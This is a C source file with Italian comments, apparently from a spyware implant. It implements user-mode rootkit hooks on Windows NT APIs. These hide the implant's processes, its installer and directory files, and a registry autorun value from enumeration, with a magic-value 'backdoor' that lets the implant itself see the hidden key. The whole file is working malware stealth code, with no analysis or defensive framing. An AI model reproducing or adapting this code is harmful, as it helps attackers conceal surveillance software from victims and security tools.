#include <windows.h>
#include "Common.h"
#include "missing.h"
#include "Hooking.h"
#include "Hiding.h"

// -------------------------------- NtQuerySystemInformation -----------------------------------
NTSTATUS __stdcall H_NtQuerySystemInformationHook(void *data_param, 
												 SYSTEM_INFORMATION_CLASS SystemInformationClass, 
												 PVOID SystemInformation, 
												 LONG SystemInformationLength,
												 PULONG ReturnLength)
{	
	BYTE *SPI_Offs;
	SYSTEM_PROCESS_INFORMATION *Spi = NULL;
	SYSTEM_PROCESS_INFORMATION *PrevSpi = NULL;

	INIT_WRAPPER(H_NtQuerySystemInformation, NTSTATUS);	
	CALL_ORIGINAL_API(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

	if (ret_code<0)
		return ret_code;

	SPI_Offs = (BYTE *)SystemInformation;
	if (SystemInformationClass==SystemProcessInformation && SystemInformation) {
		do {
			Spi = (SYSTEM_PROCESS_INFORMATION *) SPI_Offs;

			if ( SPI_Offs + sizeof(SYSTEM_PROCESS_INFORMATION) > (BYTE *) SystemInformation + SystemInformationLength )
				break;
			
			if ((DWORD)(Spi->UniqueProcessId)!=pData->pid && 
				(DWORD)(Spi->ParentProcessId)!=pData->pid &&
				(DWORD)(Spi->UniqueProcessId)!=pData->ppid) 
				PrevSpi = Spi;
			else {
				// Unlinka la struttura del nostro processo
				if(PrevSpi)
					PrevSpi->NextEntryOffset += Spi->NextEntryOffset;
				// Se e' l'ultimo processo, termina la lista
				if (Spi->NextEntryOffset == 0)
					PrevSpi->NextEntryOffset = 0;
			}
		
			SPI_Offs += Spi->NextEntryOffset;

		} while(Spi->NextEntryOffset);
	}

	return ret_code; 
}

BOOL H_NtQuerySystemInformation_setup(H_NtQuerySystemInformationStruct *data)
{
	DWORD parent_pid;
	WCHAR *parent_name;

	// Se fallisce non nasconde niente
	data->pid = -1;
	data->ppid = -1;

	if (g_core_pid) 
		data->pid = g_core_pid; // Nascondera' il core e tutti i suoi figli (fra cui anche questo processo)

	if (parent_pid = GetParentPid(g_core_pid)) { // Se il padre e' un rundll32, nasconde anche quello
		parent_name = FindProc(parent_pid);
		if (parent_name && !wcsicmp(parent_name, L"rundll32.exe"))
			data->ppid = parent_pid;
		SAFE_FREE(parent_name);
	}
	 
	return TRUE;
}

// -------------------------------- NtQueryDirectoryFile -----------------------------------
NTSTATUS __stdcall H_NtQueryDirectoryFileHook(void *data_param,
											  HANDLE FileHandle,
											  HANDLE Event,
											  PVOID ApcRoutinte,
											  PVOID ApcContext,
											  PVOID IoStausBlock,
											  BYTE *FileInformation,
											  ULONG FileInformationLength,
											  LONG FileInformationClass,
											  BOOL ReturnSingleEntry,
											  PVOID FileMask,
											  BOOL RestartScan)
{
	DWORD b_len, jj;
	DWORD *old_b_len = NULL;
	BYTE *src;
	WCHAR *file_name = NULL;

	DWORD file_name_len = 0;
	BOOL found = FALSE;
	BOOL is_to_hide;
	
	INIT_WRAPPER(H_NtQueryDirectoryFile, NTSTATUS)
	CALL_ORIGINAL_API(FileHandle, Event, ApcRoutinte, ApcContext, IoStausBlock, FileInformation, FileInformationLength, FileInformationClass, ReturnSingleEntry, FileMask, RestartScan);
	
	if(ret_code!=0 || FileInformationLength <= 0)
	   return ret_code;

	if (FileInformationClass != FileDirectoryInformation &&
		FileInformationClass != FileFullDirectoryInformation &&
		FileInformationClass != FileBothDirectoryInformation &&
		FileInformationClass != FileNamesInformation &&
		FileInformationClass != FileIdBothDirInformation &&
		FileInformationClass != FileIdFullDirectoryInformation)
		return ret_code;

	// Se e' attivo il crisis non effettua l'hiding 
	IF_ACTIVE_AGENT(PM_CRISISAGENT) 
		return ret_code;
		
	src = FileInformation;
	do {
		// Tanto per tutte le strutture e' sempre la prima entry
		b_len = ((FILE_DIRECTORY_INFORMATION *)src)->NextEntryOffset;

		if (FileInformationClass == FileDirectoryInformation) {
			file_name = (WCHAR *)(((FILE_DIRECTORY_INFORMATION *)src)->FileName);
			file_name_len = (DWORD)(((FILE_DIRECTORY_INFORMATION *)src)->FileNameLength);
		}

		if (FileInformationClass == FileFullDirectoryInformation) {
			file_name = (WCHAR *)(((FILE_FULL_DIRECTORY_INFORMATION *)src)->FileName);
			file_name_len = (DWORD)(((FILE_FULL_DIRECTORY_INFORMATION *)src)->FileNameLength);
		}

		if (FileInformationClass == FileBothDirectoryInformation) {
			file_name = (WCHAR *)(((FILE_BOTH_DIRECTORY_INFORMATION *)src)->FileName);
			file_name_len = (DWORD)(((FILE_BOTH_DIRECTORY_INFORMATION *)src)->FileNameLength);
		}

		if (FileInformationClass == FileNamesInformation) {
			file_name = (WCHAR *)(((FILE_NAMES_INFORMATION *)src)->FileName);
			file_name_len = (DWORD)(((FILE_NAMES_INFORMATION *)src)->FileNameLength);
		}

		if (FileInformationClass == FileIdBothDirInformation) {
			file_name = (WCHAR *)(((FILE_ID_BOTH_DIR_INFORMATION *)src)->FileName);
			file_name_len = (DWORD)(((FILE_ID_BOTH_DIR_INFORMATION *)src)->FileNameLength);
		}

		if (FileInformationClass == FileIdFullDirectoryInformation) {
			file_name = (WCHAR *)(((FILE_ID_FULL_DIR_INFORMATION *)src)->FileName);
			file_name_len = (DWORD)(((FILE_ID_FULL_DIR_INFORMATION *)src)->FileNameLength);
		}

		file_name_len /= sizeof(WCHAR); // E' unicode

		is_to_hide = FALSE;
		for (jj=0; jj<HIDE_NAME_COUNT; jj++) {
			IF_SAME_STRING(file_name, pData->name_to_hide[jj], file_name_len) {
				is_to_hide = TRUE;
				break;
			}
		}

		// Vede se dobbiamo ricopiare questa entry
		if (is_to_hide) {
			if (old_b_len) {
				*old_b_len += b_len;
				
				// E' l'ultima entry
				if (b_len == 0)
					*old_b_len = 0;
			} else {// E' la prima entry
				FileInformationLength -= b_len;
				if (FileInformationLength > 0) {
					MMCPY(src, src+b_len, FileInformationLength); 
					src -= b_len; // Per compensare il + di dopo 
				}
			}
		} else {
			found = TRUE;
			old_b_len = &((FILE_DIRECTORY_INFORMATION *)src)->NextEntryOffset;
		}

		src += b_len;
	} while(b_len!=0);

	if (!found)
		return 0xC000000F;  // NO_SUCH_FILE
	
	return ret_code;
}

BOOL H_NtQueryDirectoryFile_setup(H_NtQueryDirectoryFileStruct *data)
{
	wcscpy(data->name_to_hide[0], g_directory_name);
	wcscpy(data->name_to_hide[1], g_installer_name);
	wcscpy(data->name_to_hide[2], L"efi_installer.exe");

	return TRUE;
}


// -------------------------------- NtEnumerateValueKey -----------------------------------
NTSTATUS __stdcall H_NtEnumerateValueKeyHook(void *data_param,
											 HANDLE KeyHandle,
											 ULONG Index,
											 LONG KeyValueInformationClass,
											 PVOID KeyValueInformation,
											 ULONG Length,
											 PULONG ResultLength)
{
	WCHAR *value_name;
	BOOL loop;
	BOOL backdoor;
	DWORD t_index = 0;
	DWORD r_index;
	DWORD found = 0;
	DWORD information_class;
	DWORD name_len;

	INIT_WRAPPER(H_NtEnumerateValueKey, NTSTATUS)

	// Backdoor! Mettendo information_class == 0xABADC0DE
	// non viene nascosta la chiave (usata per il wrapper 
	// di enumerazione).
	if (KeyValueInformationClass == BACKDOOR_CODE) {
		backdoor = TRUE;
		KeyValueInformationClass = 0;
	} else 
		backdoor = FALSE;

	r_index = Index;
	information_class = KeyValueInformationClass; 

	do {
		loop = FALSE;
		KeyValueInformationClass = 0;
		Index = t_index;
		CALL_ORIGINAL_API(KeyHandle, Index, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);

		// If success. RIndex e' quello richiesto.
		if ((*ResultLength)>0 && ret_code==0) {
			value_name = (WCHAR *)(((KEY_VALUE_BASIC_INFORMATION *)KeyValueInformation)->Name);
			name_len = (DWORD)(((KEY_VALUE_BASIC_INFORMATION *)KeyValueInformation)->NameLength);
			name_len /= sizeof(WCHAR); // E' in unicode 
			// Se non e' la chiave da nascondere o e' richiamata come 
			// backdoor, incrementa il numero delle chiavi da far vedere.
			found++;
			IF_SAME_STRING(value_name, pData->name_to_hide, name_len)
				if (!backdoor)
					found--;

			if (found <= r_index) {
				t_index++;
				loop = TRUE;
			}
		}
	} while(loop);

	KeyValueInformationClass = information_class;
	CALL_ORIGINAL_API(KeyHandle, Index, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);

	return ret_code;
}

BOOL H_NtEnumerateValueKey_setup(H_NtEnumerateValueKeyStruct *data)
{
	wcscpy(data->name_to_hide, g_registry_key_name);
	return TRUE;
}


// -------------------------------- NtQueryKey -----------------------------------
NTSTATUS __stdcall H_NtQueryKeyHook(void *data_param,
									HANDLE KeyHandle, 
									LONG KeyInformationClass, 
									PVOID KeyInformation, 
									ULONG Length, 
									PULONG Resultlength)
{
	DWORD index;
	BYTE local_key_struct[512];
	KEY_FULL_INFORMATION *full_info;
	KEY_STR_INFORMATION *str_info;
	WCHAR *value_name;
	DWORD name_len;
	BOOL found = FALSE;
	DWORD ret_value;
	DWORD ret_len;

	INIT_WRAPPER(H_NtQueryKey, NTSTATUS)
	
	// Cerca di vedere se in questa chiave c'e' il 
	// valore da nascondere
	for (index=0;;index++) {
		ret_value = pData->pNtEnumerateValueKey(KeyHandle, index, BACKDOOR_CODE, (KEY_VALUE_BASIC_INFORMATION *)local_key_struct, sizeof(local_key_struct), &ret_len);
		if (ret_len==0 || ret_value!=0)
			break;

		value_name = (WCHAR *)(((KEY_VALUE_BASIC_INFORMATION *)local_key_struct)->Name);
		name_len = (DWORD)(((KEY_VALUE_BASIC_INFORMATION *)local_key_struct)->NameLength);
		name_len /= sizeof(WCHAR); // E' in unicode 
		IF_SAME_STRING(value_name, pData->name_to_hide, name_len)
			found = TRUE;	
	}

	CALL_ORIGINAL_API(KeyHandle, KeyInformationClass, KeyInformation, Length, Resultlength);

	// Se ha trovato il valore, e il tipo di informazione richiesto e' FULL_INFO e
	// c'e' il puntatore alla strutura FULL_INFO e il buffer la contiene tutta
	// diminuisce di 1 il numero di valori (se e' maggiore di 0), indipendentemente
	// dal valore di ritorno.
	full_info = (KEY_FULL_INFORMATION *)KeyInformation;
	if (found && KeyInformationClass==KeyFullInformation && full_info && Length>=36) 
		if (full_info->Values > 0)
			full_info->Values--;

	// Valore non definito normalmente, ma usato da RegAlyzer
	str_info = (KEY_STR_INFORMATION *)KeyInformation;
	if (found && KeyInformationClass==4 && str_info && Length>=24) 
		if (str_info->Values > 0)
			str_info->Values--;

	return ret_code;
}

BOOL H_NtQueryKey_setup(H_NtQueryKeyStruct *data)
{
	HMODULE hMod;

	VALIDPTR(hMod = GetModuleHandle("NTDLL.DLL"))
	VALIDPTR(data->pNtEnumerateValueKey = (H_NtEnumerateValueKey_t)GetProcAddress(hMod, "NtEnumerateValueKey"))
	wcscpy(data->name_to_hide, g_registry_key_name);
	 
	return TRUE;
}


// -------------------------------- ReadDirectoryChanges 
DEFAULT_SETUP_FUNC(H_ReadDirectoryChangesW)
BOOL __stdcall H_ReadDirectoryChangesWHook(void *data_param,
										   HANDLE hDirectory,
										   LPVOID lpBuffer,
										   DWORD nBufferLength,
										   BOOL bWatchSubtree,
										   DWORD dwNotifyFilter,
										   LPDWORD lpBytesReturned,
										   LPOVERLAPPED lpOverlapped,
										   LPOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine)
{
	DWORD local_notify_filter;
	INIT_WRAPPER(H_ReadDirectoryChangesW, BOOL)

	local_notify_filter = dwNotifyFilter & (~0x10);
	CALL_ORIGINAL_API(hDirectory, lpBuffer, nBufferLength, bWatchSubtree, local_notify_filter, lpBytesReturned, lpOverlapped, lpCompletionRoutine);
	
	return ret_code;
}
